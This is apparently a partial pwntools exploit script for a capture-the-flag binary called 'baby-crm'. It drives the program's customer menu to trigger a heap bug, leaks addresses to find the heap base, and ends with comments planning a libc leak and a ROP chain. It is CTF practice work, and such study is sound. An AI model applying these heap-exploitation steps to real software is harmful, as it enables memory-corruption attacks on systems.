#!/usr/bin/python3

from pwn import *

context.terminal = ["kitty"]
script = \
"""
b main
c
del
c
"""

if args.REMOTE:
    p = remote
elif args.GDB:
    p = gdb.debug("./baby-crm", gdbscript=script)
else:
    p = process("./baby-crm")

def new_customer(name: str):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b": ", name)

def alter_customer(index: int, option: int, **kwargs):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b": ", str(index).encode())
    p.sendlineafter(b"> ", str(option).encode())
    match option:
        case 1:
            name = kwargs["name"]
            p.sendlineafter(b": ", name)
        case 2:
            desc = kwargs["desc"]
            p.sendlineafter(b": ", desc)
        case 3:
            val = kwargs["val"]
            data = kwargs["data"]
            p.sendlineafter(b": ", str(val).encode() + data)
        case 4:
            order = kwargs["order"]
            data = kwargs["data"]
            p.sendlineafter(b": ", str(order).encode())
            p.sendafter(b": ", data.ljust(0x50, b"\x00"))

def show_customer(index: int):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b": ", str(index).encode())
    p.recvuntil(b": ")
    p.recvuntil(b"Description: \n")
    p.recvuntil(b"Description: \n")
    return p.recv(0x50)

def qwords(data):
    return [u64(data[i:i+8]) for i in range(0, len(data), 8)]

def help(option: int):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"> ", str(option).encode())

new_customer(b"A" * 32)
new_customer(b"B" * 32)
alter_customer(0, 3, val=0.0, data=b"XXXX")
help(2)
alter_customer(1, 3, val=1.0, data=b"YYYY")
leak = show_customer(1)
leak = qwords(leak)
log.info(f"leaks: {list(map(hex, leak))}")
heapbase = leak[5] - 0x11ee8
log.info(f"heapbase: {heapbase:x}")
fakeobj = heapbase + 0x11eb0

"""
resize vector until free'd into unsorted bin
point string to free'd chunk, leak libc
leak environ
write rop chain to stack
"""

p.interactive()
